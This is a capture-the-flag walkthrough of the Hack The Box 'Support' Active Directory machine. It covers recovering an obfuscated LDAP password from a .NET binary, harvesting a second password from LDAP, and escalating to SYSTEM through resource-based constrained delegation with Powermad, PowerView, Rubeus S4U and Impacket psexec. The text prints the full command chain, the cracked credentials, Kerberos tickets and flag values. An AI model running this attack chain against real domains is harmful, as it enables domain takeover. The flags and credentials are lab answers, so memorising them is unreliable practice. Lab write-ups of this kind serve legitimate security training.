# ENUMERATION
---



## OPEN PORTS
---

| Port | Service |
| -------- | ----------------------------------------------------------------------------------------------------- |
| 53/tcp | domain (Simple DNS Plus) |
| 88/tcp | kerberos-sec (Microsoft Windows Kerberos (server time: 2025-04-21 18:06:57Z)) |
| 135/tcp | msrpc (Microsoft Windows RPC) |
| 139/tcp | netbios-ssn (Microsoft Windows netbios-ssn) |
| 389/tcp | ldap (Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)) |
| 445/tcp | microsoft-ds? |
| 464/tcp | kpasswd5? |
| 593/tcp | ncacn_http (Microsoft Windows RPC over HTTP 1.0) |
| 636/tcp | tcpwrapped |
| 3268/tcp | ldap (Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)) |
| 3269/tcp | tcpwrapped |
| 5985/tcp | http (Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)) |


# RECONNAISSANCE
---

We got SMB enabled, let's check if anonymous login is enabled:

![Pasted image 20250421130457.png](../../IMAGES/Pasted%20image%2020250421130457.png)

We got some shares, most interesting one is `support-tools` one, let's check it out:


![Pasted image 20250421130627.png](../../IMAGES/Pasted%20image%2020250421130627.png)

We got some common tools but there is one file that is not one of them:

```
UserInfo.exe.zip
```


Let's get it on our local machine and analyze it:

![Pasted image 20250421130853.png](../../IMAGES/Pasted%20image%2020250421130853.png)

We got a bunch of files, since we got a `.exe`, we can use `ILSPY` to perform reverse engineering in order to find anything valuable:

![Pasted image 20250421132553.png](../../IMAGES/Pasted%20image%2020250421132553.png)

There's an `ldapQuery()` function which seems to be interesting it uses `getPassword` function, maybe we can find some credentials if we look further:

![Pasted image 20250421132710.png](../../IMAGES/Pasted%20image%2020250421132710.png)

We got something called `enc_password`:

![Pasted image 20250421132746.png](../../IMAGES/Pasted%20image%2020250421132746.png)

There we go, we got a password, since it is encrypted, we can craft a simple python script to decrypt it:

```python
from base64 import b64decode
from itertools import cycle

def decrypt_password(encrypted_b64: bytes, key: bytes) -> str:
 # Decode the Base64 string
 encrypted = b64decode(encrypted_b64)
 
 # XOR each byte with the key (cycled) and then XOR with 223
 decrypted_bytes = [e ^ k ^ 223 for e, k in zip(encrypted, cycle(key))]
 
 # Convert to bytes and decode as UTF-8
 return bytearray(decrypted_bytes).decode('utf-8')

# The values from your example
encrypted_password = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
decryption_key = b"armando"

# Decrypt and print
password = decrypt_password(encrypted_password, decryption_key)
print(f"Decrypted password: {password}")
```


If we run the script, we get this:

```
python3 script.py
Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Nice, with the credentials, we can now proceed to exploitation.


# EXPLOITATION
---

With previous enumeration, we found:

```
support.htb dc.support.htb
```

We can add them to `/etc/hosts` to use `crackmapexec` in order to check if the credentials work, I will switch to `kali` at this stage since it's easier for me to work in windows environments with `kali`:

```python
crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 2>/dev/null
SMB support.htb 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB support.htb 445 DC [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```


As we can see, the credentials work, we can use `ldapsearch` to show all the items in the `AD`:

```bash
ldapsearch -H ldap://support.htb -x -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

Since it outputs us a lot of stuff, we can either use grep or submit the output to a file and analyze it with a code editor, I analyzed it with `vscode` and found this:

![Pasted image 20250421135556.png](../../IMAGES/Pasted%20image%2020250421135556.png)

We got a password for an user named `support`:

```
support:Ironside47pleasure40Watchful
```


We can use `evil-winrm` to get a shell:

```bash
evil-winrm -i 'support.htb' -u 'support' -p 'Ironside47pleasure40Watchful'
```


![Pasted image 20250421135830.png](../../IMAGES/Pasted%20image%2020250421135830.png)

With this shell, we can get `user.txt`:

```
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
6fd2da1463398ae6580fe963dbbe4dc1
```


Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

First step would be checking our privileges using bloodhound:

```bash
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
```

If we analyze the data with bloodhound, we can realize that `support` has `GenericAll` on the computer object, knowing this, This privilege grants full control over the object, enabling the modification of critical security attributes, we can use some tools to exploit this, we can use these three tools:


1. [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
2. [PowerMad.ps1](- [PowerMad.ps1](https://github.com/Kevin-Robertson/Powermad))
3. [Rubeus.exe](https://github.com/GhostPack/Rubeus)

Once we got them, upload them using the `upload` functionality on `evil-winrm` and import them:

```
Import-Module .\Powermad.ps1 
Import-Module .\PowerView.ps1
```

Now, we can proceed with the exploitation, let's do the following:

1. Create a fake computer:

```powershell
New-MachineAccount -MachineAccount PWNED -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

![Pasted image 20250421164453.png](../../IMAGES/Pasted%20image%2020250421164453.png)

2. Set `msds-AllowedToActOnBehalfOfOtherIdentity`:

```powershell
Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount PWNED$
Get-ADComputer dc -Properties PrincipalsAllowedToDelegateToAccount
```

3. Get `S4U` hash and impersonate administrator user with `Rubeus`:

```
./Rubeus.exe hash /user:PWNED$ /password:Password123 /domain:support.htb

 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/

 v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password : Password123
[*] Input username : PWNED$
[*] Input domain : support.htb
[*] Salt : SUPPORT.HTBhostpwned.support.htb
[*] rc4_hmac : 58A478135A93AC3BF058A5EA0E8FDB71
[*] aes128_cts_hmac_sha1 : 1522E0E487A3B7CDE79BB5C228DE2288
[*] aes256_cts_hmac_sha1 : D87F6BB8DB1D9E226599FE7F40284DEFE42550653E153735022A78593823104C
[*] des_cbc_md5 : E3FE51F1C85D15C1
```

We can now use the `rc4_hmac` hash to impersonate the administrator, we can submit the hash into a `.ccache` file to use it with impacket:

```
.\Rubeus.exe s4u /user:PWNED$ /password:Password123 /domain:support.htb /impersonateuser:administrator /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:host/dc.support.htb /nowrap

 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/

 v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\PWNED$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

 doIFSDCCBUSgAwIBBaEDAgEWooIEYjCCBF5hggRaMIIEVqADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBBwwggQYoAMCARKhAwIBAqKCBAoEggQGmtVLfMW4wgoiU+y45ZkWbsQR8g5WFMbbmZBSUdXOcuSeoCb8pwdLDvgOUrXJLYSsz5qN4uPTHHSGTmgPTk0tVxpB7ewkg8LQH+CZ+3xoslVwoz3++xby4L8S4xzti8JwzsOyFr2dsiPGUu8Z0I8UAXoZdZubvFzmPYM2Hux3xEcsBr8aWK3kHDWd1hH53jrcUEVxIsPu6ga3a4ZZ++1kSAhVg5jaMMPn7rJ3BS67DZyT1RZeZeq5TRk89TwJfwsu4c2GDQIXCS+XSYVtna+oyWyHpBPsI1q2/fkLTlUYnfYuz5MIrX0JaAEiE08RFIxK9G2Fjc8EoUD67D1RBjrIxbnVKgzQ9xljRBUfzdiQkJhDKeNMB5Rvqar9KvuZGxoi49YF2QKwNUGVxAcl8lwQOsoKd6JhvvtAmGgj7QlDM6SHSP6sBw7rw4nKza1O5L74ipBLNOKa689BwO4YqOnniTxa3UnfVW25nxlh4Un38KA0vzx/BrMGGu/DXBvBocSCFcooI9p5eUrPliETopKFwz/Cewpaxqr2crSiuZRkud4dwfi5MJoi1oJH6TNI7W6sXRXMn5XyBRf2iKVd93RSypaOL783Itbl1LrBEvbm8C5+L3+IR59zj448LDYImvZnzfZ/hsAgLdmMLAUdNVzjXoWWjGDSLEZRUDTNZHcFyLWJdlJb03FRP0c5JWtulpgD7u7w0j4KFo6sHRvkb0alQ5zb6dI+kJ+VV4PItX6Gu+F7XEQ8YkSZgVUZHgb4iWjrKacqw/o55awlhG0qwPH7LwSpkzOEzvmc6fl5gokAB+UZVvlBtfhl3IJm1phi/qsCPwS7rgbf5C0Cl7KvapdKD2FMREBMPdn7xtacFbsQ2buBcTGRo1qvuEC0EchnKTjqC16DHstaWr3nsIcti0kf+I723lP4ApWkHtW6DSPLLaYTl+hTvygecMLex47sKJ5zwRaTXf2f/6JGAiUv9xTKTjZ5SsZVnTV9b6477ADdR8PfbZYdX8PHCwCYC6fJAxkT6b7qmdjGPjP4RyDUPQzmguC3C+G6ayZ6exfAGbjidk9gHu9CThVon2g49d2Ww/ERHcwVdseqQWH2DTxGX0tiR4MtrYtmcL5yVcDLTwQGc/PuN7xgiHs9nnaV8DrnHQYrenKcC8rPlARuQvG1N0korBJAzkaI0jpHiGcGRw0xpJvqx/Wn1gUjcbDIXb2XaTR4xtyBSDvCy/+hRUOOIqVRpbvJp2+kY6QJljOCDiXbuM6Cnhx0lZqYLC0FcxkD5o+o5uRfJMNxkQLgx2IgDEbtzAYn7OUJYXEOYqnXoQ2q3ukaSywq8x7oyLkK9tmg2OgqTnV6t9SEZLNOA71vj6nODTZxl13ox6OB0TCBzqADAgEAooHGBIHDfYHAMIG9oIG6MIG3MIG0oBswGaADAgEXoRIEEJaztQtqalhDS+02ypzgA5ChDRsLU1VQUE9SVC5IVEKiEzARoAMCAQGhCjAIGwZQV05FRCSjBwMFAEDhAAClERgPMjAyNTA0MjEyMTQ2NTFaphEYDzIwMjUwNDIyMDc0NjUxWqcRGA8yMDI1MDQyODIxNDY1MVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBvcnQuaHRi


[*] Action: S4U

[*] Building S4U2self request for: 'PWNED$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'PWNED$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

 doIFoDCCBZygAwIBBaEDAgEWooIEwDCCBLxhggS4MIIEtKADAgEFoQ0bC1NVUFBPUlQuSFRCohMwEaADAgEBoQowCBsGUFdORUQko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHFl7lLM8DhTvoFzonOdrrvUzCX/Hm8i3a2ud0USkGzg9i4bWYjD5PuzRe7wuVTnSGtIqG89ezGNS9co8kr102bepfs0to4nLWlwTpEMoWsdhBOhCcXnslUyHBZcAXTMejlYzSUfQ5DFZUnscfNmVI7buUGiOv7aItM27CQeIBuupTbtqt2MvhtZa+6XNthnHwzbMpRvgCXfjS1nD86bxuAca0Gqc56Cwvw6gCrr4Hb7sHY0tgWbgMdHmZMqv0AP25WrEIKPvc4tbLaS5oji+p5K1AzAYQa7dmZxRWVZsd9omgRUv+uzWB6Hjx/FkmP9KGlu+jpee2EEBbn/qDVmybm5TlmDJ+a0Z+jd/ZhXYQbZuahUIxjobRRayrMEWyQEZ6WqQkD8RoNAqtWncJQL5tFt2Set73lQeGVNlwSlR+Hur7FjSxRXK07lSNorVmqPTjhEsH6PhmoPJzlUDXFwHDIgBfzxwiGXkfw3LSGuCTeAqpYfP0kwNsqtE7jk81SP5G+4qOBC73mdj9+XFPtObA4cjnrBIT4M43UX4NdGPogQaGYTk0r357369psuBRlXCroExNpwGuph+i74cksy4OzqhK6h1zpAXhJjxdRme0MpW7C4bNx4odpiYrxhWcGxgoj9ZWiLq6+zkLTAR193kspUtdLso4ZIepidYbUJO9FcylpEBBWxxmdPGYq3u7qydC1JEVZHuCQ+UdJNuDVARiek7z0CHj1gocSTud9o4BASIT7Y0bJaQHenoKAyMSyqK/xEDWMSmR9iH526qXB32e0p1FLbT6Wu/WLnSpe1xCiYG3Kd9OOkgYihTlWS8FES/QyO+I9Swnsoy0JV6GRL5rNozD/RXgmtNndGu0A3xyFhca2+/t2A5nqRsyNQMB/b0wVh+ust8CFvncMfMx0LghupmO1D0L48eQOzPnO5JeourgNkLlIQbAdYmMnz0gOfNkWkGAHq8WurOZBboxJjZxmKke75PnCewpmEGjZg6owzqUPFbWHLobqcoVSIHzU7TCQUSJXdhFC3qBMY2kX0Mplmk4HalM1MPpUbYEcM8USLi6R98ojgipQb3ZH2ip7HfhY2u54xXIG3w31sa+06/PvDNm1Wm37xdBLlkVjfiro20pYAHR4IS8/meztn30wOwPmPHrNeNJrbMSvWka2nsVu5pqBUZ+nNqtjE5cJkkGjcjq1QqZvJBdJL5jRGm/SBxHOtJN1r7E5U+mBe/4sMGX+axCV3Qgs69SRLJc/RV0r3dq571PLyVTIxhh8aFVb46sMlJ87jEO+WX36ud65SFJv4NF2oO9Cj5ZRZPwc3NhD9f6ChjlqOKABc9ONSTkZaq+e3vtTcgauaEcyjtW3BujX2Vku4rSF3y9fNXtkEj1GKhkqtGOaOOoawvwadbzQPyy5uVelEH5nb5YzXjeX7NqBtDUNM0QjVL1YX7Duf/BaFLMxcOTj9bL5RgjC2L1b4QA0oFgd7PU0Pph5Q8rpko09xhpczP2fuAp7+7JuN3cd+Ki6jgcswgcigAwIBAKKBwASBvX2BujCBt6CBtDCBsTCBrqAbMBmgAwIBF6ESBBCu3+XJh9Qu6KeLU04lweIZoQ0bC1NVUFBPUlQuSFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI1MDQyMTIxNDY1MVqmERgPMjAyNTA0MjIwNzQ2NTFapxEYDzIwMjUwNDI4MjE0NjUxWqgNGwtTVVBQT1JULkhUQqkTMBGgAwIBAaEKMAgbBlBXTkVEJA==

[*] Impersonating user 'administrator' to target SPN 'host/dc.support.htb'
[*] Building S4U2proxy request for service: 'host/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'host/dc.support.htb':

 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
```

We need to copy this hash:

```
[*] Impersonating user 'administrator' to target SPN 'host/dc.support.htb'
[*] Building S4U2proxy request for service: 'host/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'host/dc.support.htb':

 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
```

Let's copy it and decode:

```
echo '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' | base64 -d > administrator.kirbi
```

Now, let's use `ticketConverter.py`:

```
python3 ticketConverter.py administrator.kirbi administrator.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

We can now copy it to `/tmp` and set the `KRB5CCNAME` to point our `administrator.ccache` file:

```bash
mv administrator.ccache /tmp
export KRB5CCNAME=/tmp/administrator.ccache
```

Now, we can use `psexec.py` to get a shell:

```
python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

![Pasted image 20250421165540.png](../../IMAGES/Pasted%20image%2020250421165540.png)

As we can see, we got our shell as `nt authority/system` and can finally read `root.txt`:

```
C:\Users\Administrator\Desktop> type root.txt
1937d45946f8dcc401311ad5e30e3594
```

https://www.hackthebox.com/achievement/machine/1872557/484

